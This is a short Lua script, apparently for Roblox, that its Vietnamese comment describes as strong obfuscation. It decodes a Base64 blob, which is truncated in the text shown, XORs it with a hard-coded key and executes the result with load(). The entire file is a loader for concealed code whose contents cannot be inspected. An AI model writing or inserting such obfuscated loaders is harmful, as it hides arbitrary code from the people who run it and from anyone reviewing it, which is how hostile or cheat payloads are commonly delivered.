-- Mã hóa cực mạnh: Obfuscate + Base64 + XOR + loadstring
local function x1(data, k)
    local r = {}
    for i = 1, #data do
        local c = string.byte(data, i)
        local kk = string.byte(k, (i - 1) % #k + 1)
        r[i] = string.char(bit32.bxor(c, kk))
    end
    return table.concat(r)
end

local e1 = [[
RxleVB0NRhg9CxAQSl5fUVQhFCMYLxFRHCdISEMnU11XDwpRBycrGkIHNw1dQRBeUUtQP0dRXUQEWw01BFUxNVxjV0c7XRARblUUCTUFEFkHV0RhUD9CGhcrQBY8IQYmBjJEWVFQbx15GCELVQJ0...
]]

local k1 = "M4stNh4nThuc@2025"

local d1 = game:GetService("HttpService"):Base64Decode(e1)
local s1 = x1(d1, k1)
load(s1)()
